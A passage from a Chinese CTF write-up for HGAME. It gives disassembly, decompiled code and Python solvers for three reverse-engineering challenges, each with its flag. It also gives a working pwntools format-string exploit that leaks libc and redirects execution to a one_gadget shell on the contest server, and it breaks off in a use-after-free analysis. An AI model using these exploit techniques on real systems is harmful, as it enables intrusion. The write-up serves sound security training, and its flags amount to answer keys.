class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.send(shellcode2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><h3 id="easyasm"><a href="#easyasm" class="headerlink" title="easyasm"></a>easyasm</h3><p>根据汇编找逻辑，分析完发现只是简单的异或：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">; void __cdecl enc(char *p)</span><br><span class="line">.text:00401160 _enc            proc near               ; CODE XREF: _main+1B↑p</span><br><span class="line">.text:00401160</span><br><span class="line">.text:00401160 i               = dword ptr -4</span><br><span class="line">.text:00401160 Str             = dword ptr  8</span><br><span class="line">.text:00401160</span><br><span class="line">.text:00401160                 push    ebp</span><br><span class="line">.text:00401161                 mov     ebp, esp</span><br><span class="line">.text:00401163                 push    ecx</span><br><span class="line">.text:00401164                 mov     [ebp+i], 0</span><br><span class="line">.text:0040116B                 jmp     short loc_401176</span><br><span class="line">.text:0040116D ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0040116D</span><br><span class="line">.text:0040116D loc_40116D:                             ; CODE XREF: _enc+3B↓j	i自增</span><br><span class="line">.text:0040116D                 mov     eax, [ebp+i]</span><br><span class="line">.text:00401170                 add     eax, 1</span><br><span class="line">.text:00401173                 mov     [ebp+i], eax	</span><br><span class="line">.text:00401176</span><br><span class="line">.text:00401176 loc_401176:                             ; CODE XREF: _enc+B↑j</span><br><span class="line">.text:00401176                 mov     ecx, [ebp+Str]</span><br><span class="line">.text:00401179                 push    ecx             ; Str</span><br><span class="line">.text:0040117A                 call    _strlen			; 返回Str的长度至eax</span><br><span class="line">.text:0040117F                 add     esp, 4</span><br><span class="line">.text:00401182                 cmp     [ebp+i], eax		; i与len(Str)比较</span><br><span class="line">.text:00401185                 jge     short loc_40119D		; 大则跳出循环</span><br><span class="line">.text:00401187                 mov     edx, [ebp+Str]</span><br><span class="line">.text:0040118A                 add     edx, [ebp+i]</span><br><span class="line">.text:0040118D                 movsx   eax, byte ptr [edx]	; movsx 带符号扩展传送</span><br><span class="line">.text:00401190                 xor     eax, 33h				; 异或加密</span><br><span class="line">.text:00401193                 mov     ecx, [ebp+Str]</span><br><span class="line">.text:00401196                 add     ecx, [ebp+i]</span><br><span class="line">.text:00401199                 mov     [ecx], al</span><br><span class="line">.text:0040119B                 jmp     short loc_40116D</span><br><span class="line">.text:0040119D ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0040119D</span><br><span class="line">.text:0040119D loc_40119D:                             ; CODE XREF: _enc+25↑j</span><br><span class="line">.text:0040119D                 mov     esp, ebp</span><br><span class="line">.text:0040119F                 pop     ebp</span><br><span class="line">.text:004011A0                 retn</span><br><span class="line">.text:004011A0 _enc            endp</span><br><span class="line">Input: your flag</span><br><span class="line">Encrypted result: 0x5b,0x54,0x52,0x5e,0x56,0x48,0x44,0x56,0x5f,0x50,0x3,0x5e,0x56,0x6c,0x47,0x3,0x6c,0x41,0x56,0x6c,0x44,0x5c,0x41,0x2,0x57,0x12,0x4e</span><br></pre></td></tr></table></figure>

<p><code>exp</code>如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">data=[<span class="number">0x5b</span>,<span class="number">0x54</span>,<span class="number">0x52</span>,<span class="number">0x5e</span>,<span class="number">0x56</span>,<span class="number">0x48</span>,<span class="number">0x44</span>,<span class="number">0x56</span>,<span class="number">0x5f</span>,<span class="number">0x50</span>,<span class="number">0x3</span>,<span class="number">0x5e</span>,<span class="number">0x56</span>,<span class="number">0x6c</span>,<span class="number">0x47</span>,<span class="number">0x3</span>,<span class="number">0x6c</span>,<span class="number">0x41</span>,<span class="number">0x56</span>,<span class="number">0x6c</span>,<span class="number">0x44</span>,<span class="number">0x5c</span>,<span class="number">0x41</span>,<span class="number">0x2</span>,<span class="number">0x57</span>,<span class="number">0x12</span>,<span class="number">0x4e</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i^<span class="number">0x33</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># hgame&#123;welc0me_t0_re_wor1d!&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="easyenc"><a href="#easyenc" class="headerlink" title="easyenc"></a>easyenc</h3><p>简单的加密手法，找到<code>you are right</code>简单分析即可，如果不是<code>exe</code>文件的话还想试试<code>angr</code>一把梭：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// al</span></span><br><span class="line">  <span class="type">char</span> *v6; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">int</span> v8[<span class="number">10</span>]; <span class="comment">// [rsp+20h] [rbp-19h]</span></span><br><span class="line">  <span class="type">char</span> v9; <span class="comment">// [rsp+48h] [rbp+Fh]</span></span><br><span class="line">  __int128 v10[<span class="number">3</span>]; <span class="comment">// [rsp+50h] [rbp+17h] BYREF</span></span><br><span class="line">  __int16 v11; <span class="comment">// [rsp+80h] [rbp+47h]</span></span><br><span class="line"></span><br><span class="line">  v8[<span class="number">0</span>] = <span class="number">0x9FDFF04</span>;</span><br><span class="line">  v8[<span class="number">1</span>] = <span class="number">0xB0F301</span>;</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  v8[<span class="number">2</span>] = <span class="number">0xADF00500</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v10, <span class="number">0</span>, <span class="keyword">sizeof</span>(v10));</span><br><span class="line">  v3 = <span class="number">0</span>i64;</span><br><span class="line">  v8[<span class="number">3</span>] = <span class="number">0x5170607</span>;</span><br><span class="line">  v8[<span class="number">4</span>] = <span class="number">0x17FD17EB</span>;</span><br><span class="line">  v8[<span class="number">5</span>] = <span class="number">0x1EE01EA</span>;</span><br><span class="line">  v8[<span class="number">6</span>] = <span class="number">0xFA05B1EA</span>;</span><br><span class="line">  v8[<span class="number">7</span>] = <span class="number">0xAC170108</span>;</span><br><span class="line">  v8[<span class="number">8</span>] = <span class="number">0xFDEA01EC</span>;</span><br><span class="line">  v8[<span class="number">9</span>] = <span class="number">0x60705F0</span>;</span><br><span class="line">  v9 = <span class="number">0xF9</span>;</span><br><span class="line">  sub_140001064(<span class="string">&quot;%50s&quot;</span>, v10);</span><br><span class="line">  v4 = <span class="number">-1</span>i64;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    ++v4;</span><br><span class="line">  <span class="keyword">while</span> ( *(v10 + v4) );</span><br><span class="line">  <span class="keyword">if</span> ( v4 != <span class="number">41</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = (*(v10 + v3) ^ <span class="number">0x32</span>) - <span class="number">86</span>;</span><br><span class="line">    *(v10 + v3) = v5;</span><br><span class="line">    <span class="keyword">if</span> ( *(v8 + v3) != v5 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( ++v3 &gt;= <span class="number">41</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = <span class="string">&quot;you are right!&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v6 = <span class="string">&quot;wrong!&quot;</span>;</span><br><span class="line">LABEL_8:</span><br><span class="line">  sub_140001010(v6);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>exp</code>如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">data=[<span class="number">0x04</span>, <span class="number">0xFF</span>, <span class="number">0xFD</span>, <span class="number">0x09</span>, <span class="number">0x01</span>, <span class="number">0xF3</span>, <span class="number">0xB0</span>, <span class="number">0x00</span>,</span><br><span class="line">      <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0xF0</span>, <span class="number">0xAD</span>, <span class="number">0x07</span>, <span class="number">0x06</span>, <span class="number">0x17</span>, <span class="number">0x05</span>,</span><br><span class="line">      <span class="number">0xEB</span>, <span class="number">0x17</span>, <span class="number">0xFD</span>, <span class="number">0x17</span>, <span class="number">0xEA</span>, <span class="number">0x01</span>, <span class="number">0xEE</span>, <span class="number">0x01</span>,</span><br><span class="line">      <span class="number">0xEA</span>, <span class="number">0xB1</span>, <span class="number">0x05</span>, <span class="number">0xFA</span>, <span class="number">0x08</span>, <span class="number">0x01</span>, <span class="number">0x17</span>, <span class="number">0xAC</span>,</span><br><span class="line">      <span class="number">0xEC</span>, <span class="number">0x01</span>, <span class="number">0xEA</span>, <span class="number">0xFD</span>, <span class="number">0xF0</span>, <span class="number">0x05</span>, <span class="number">0x07</span>, <span class="number">0x06</span>,</span><br><span class="line">      <span class="number">0xF9</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(((i+<span class="number">86</span>)%<span class="number">256</span>)^<span class="number">0x32</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># hgame&#123;4ddit1on_is_a_rever5ible_0peration&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="encode"><a href="#encode" class="headerlink" title="encode"></a>encode</h3><p>将一个数分开二次加密记录，一个计算<code>%16</code>的余数，另一个计算<code>/16</code>的整数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4[<span class="number">100</span>]; <span class="comment">// [esp+0h] [ebp-1CCh] BYREF</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">52</span>]; <span class="comment">// [esp+190h] [ebp-3Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [esp+1C4h] [ebp-8h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+1C8h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(v5, <span class="number">0</span>, <span class="number">0x32</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(v4, <span class="number">0</span>, <span class="keyword">sizeof</span>(v4));</span><br><span class="line">  sub_4011A0(<span class="string">&quot;%50s&quot;</span>, v5);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">50</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v4[<span class="number">2</span> * i] = v5[i] &amp; <span class="number">0xF</span>;</span><br><span class="line">    v4[<span class="number">2</span> * i + <span class="number">1</span>] = (v5[i] &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0xF</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">100</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v4[j] != dword_403000[j] )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_401160(Format, v4[<span class="number">0</span>]);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_401160(aYesYouAreRight, v4[<span class="number">0</span>]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>exp</code>如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">result=[<span class="number">8</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">6</span>,</span><br><span class="line">        <span class="number">11</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">6</span>,</span><br><span class="line">        <span class="number">4</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">7</span>,</span><br><span class="line">        <span class="number">15</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">7</span>,</span><br><span class="line">        <span class="number">15</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">5</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">7</span>,</span><br><span class="line">        <span class="number">5</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">5</span>,</span><br><span class="line">        <span class="number">5</span>, <span class="number">6</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">14</span>, <span class="number">6</span>,</span><br><span class="line">        <span class="number">5</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">flag=[<span class="number">0</span>]*<span class="number">50</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    result[<span class="number">2</span>*i]=result[<span class="number">2</span>*i] &amp; <span class="number">0xf</span></span><br><span class="line">    result[<span class="number">2</span>*i+<span class="number">1</span>]=(result[<span class="number">2</span>*i+<span class="number">1</span>] &amp; <span class="number">0xf</span>) &lt;&lt; <span class="number">4</span></span><br><span class="line">    flag[i]=result[<span class="number">2</span>*i]+result[<span class="number">2</span>*i+<span class="number">1</span>]</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># hgame&#123;encode_is_easy_for_a_reverse_engineer&#125;</span></span><br></pre></td></tr></table></figure>

<h1 id="WEEK2"><a href="#WEEK2" class="headerlink" title="WEEK2"></a>WEEK2</h1><h2 id="pwn-1"><a href="#pwn-1" class="headerlink" title="pwn"></a>pwn</h2><h3 id="YukkuriSay"><a href="#YukkuriSay" class="headerlink" title="YukkuriSay"></a>YukkuriSay</h3><p>考察栈外的格式化漏洞，且<code>read</code>次数只有一次，说明一次只能修改一个指定地址。</p>
<img src="https://kjimg10.360buyimg.com/ott/jfs/t1/99040/18/33955/52628/63c4b592Fdf5a68c1/c4c2b5bfadb8f836.png" style="zoom: 67%;" />

<ul>
<li>第一次需要用来泄露+返回，将<code>buf</code>充满，会通过<code>print_str</code>泄露出一个残留的栈地址：</li>
</ul>
<img src="https://kjimg10.360buyimg.com/ott/jfs/t1/140789/38/32753/51582/63c4b696F25308ff7/31bf55ae390a5057.png" style="zoom:67%;" />

<ul>
<li>不要<code>n</code>，继续在<code>buf</code>上布置栈返回地址，使其返回到<code>_start</code>（返回<code>main</code>和<code>vuln</code>会报错），顺便泄露出<code>libc</code>。</li>
<li>由于<code>printf(str)</code>最稳妥的修改方法是一个地址中的<code>1字节+2字节</code>(<code>2+2</code>需要爆破)，因此不难想到劫持程序执行流为<code>one_gadget</code>，而返回地址<code>__libc_start_main+???</code>作为<code>libc</code>地址显然和<code>one_gadget</code>具有更好的相似性，在返回到<code>__libc_start_main+???</code>时可以观察到<code>rdx=0</code>和<code>r15=0</code>：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">0xe3afe execve(&quot;/bin/sh&quot;, r15, r12)</span><br><span class="line">constraints:</span><br><span class="line">  [r15] == NULL || r15 == NULL</span><br><span class="line">  [r12] == NULL || r12 == NULL</span><br><span class="line"></span><br><span class="line">0xe3b01 execve(&quot;/bin/sh&quot;, r15, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  [r15] == NULL || r15 == NULL</span><br><span class="line">  [rdx] == NULL || rdx == NULL</span><br><span class="line"></span><br><span class="line">0xe3b04 execve(&quot;/bin/sh&quot;, rsi, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  [rsi] == NULL || rsi == NULL</span><br><span class="line">  [rdx] == NULL || rdx == NULL</span><br></pre></td></tr></table></figure>

<ul>
<li>不难想到用第二个<code>gadget</code>。</li>
<li><code>exp</code>如下：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io=process(&quot;./vuln&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;week-2.hgame.lwsec.cn&quot;</span>,<span class="number">31352</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;vuln&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;libc-2.31.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">&quot;What would you like to let Yukkri say?\n&quot;</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">256</span>)</span><br><span class="line">stack=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">8</span></span><br><span class="line">log.success(<span class="string">&quot;stack===&gt;&quot;</span>+<span class="built_in">hex</span>(stack))</span><br><span class="line">io.sendlineafter(<span class="string">&quot;anything else?(Y/n)\n&quot;</span>,<span class="string">b&quot;Y&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.send(p64(stack)*<span class="number">32</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;anything else?(Y/n)\n&quot;</span>,<span class="string">b&quot;n&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&quot;%45$p%4418c%8$hn&quot;</span></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">libc_base=<span class="built_in">int</span>(io.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">243</span>-libc.sym[<span class="string">&quot;__libc_start_main&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base==&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">one_gadget=libc_base+<span class="number">0xe3b01</span></span><br><span class="line">m1=(one_gadget&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span></span><br><span class="line">m2=one_gadget &amp; <span class="number">0xffff</span></span><br><span class="line">log.success(<span class="string">&quot;one_gadget==&quot;</span>+<span class="built_in">hex</span>(one_gadget))</span><br><span class="line">log.success(<span class="string">&quot;m1=&quot;</span>+<span class="built_in">hex</span>(m1)+<span class="string">&quot;;m2=&quot;</span>+<span class="built_in">hex</span>(m2))</span><br><span class="line">stack2=stack-<span class="number">224</span></span><br><span class="line">log.success(<span class="string">&quot;stack2==&quot;</span>+<span class="built_in">hex</span>(stack2))</span><br><span class="line">io.sendafter(<span class="string">&quot;What would you like to let Yukkri say?\n&quot;</span>,p64(stack2+<span class="number">2</span>)+p64(stack2))</span><br><span class="line">io.sendlineafter(<span class="string">&quot;anything else?(Y/n)\n&quot;</span>,<span class="string">b&quot;n&quot;</span>)</span><br><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%8$hhn&quot;</span>.<span class="built_in">format</span>(m1)</span><br><span class="line">payload+=<span class="string">&quot;%&#123;&#125;c%9$hn&quot;</span>.<span class="built_in">format</span>(m2-m1)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="editable-note"><a href="#editable-note" class="headerlink" title="editable_note"></a>editable_note</h3><p><code>libc2.31</code>下常规的<code>uaf</code>漏洞。</p>
<ul>
<li>add：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">add_note</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v0; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">int</span> size[<span class="number">7</span>]; <span class="comment">// [rsp+4h] [rbp-1Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  *&amp;size[<span class="number">1</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;v2);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt;= <span class="number">0xF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( notes[v2] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;This page has been used.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, size);</span><br><span class="line">      <span class="keyword">if</span> ( size[<span class="number">0</span>] &lt;= <span class="number">0xFF</span>u )</span><br><span class="line">      &#123;</span><br><span class="line">        v0 = v2;</span><br><span class="line">        notes[v0] = <span class="built_in">malloc</span>(size[<span class="number">0</span>]);</span><br><span class="line">        note_size[v2] = size[<span class="number">0</span>];</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Too big.&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;There are only 16 pages in this notebook.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ *&amp;size[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>delete中出现<code>uaf</code>漏洞：</li>
</ul>
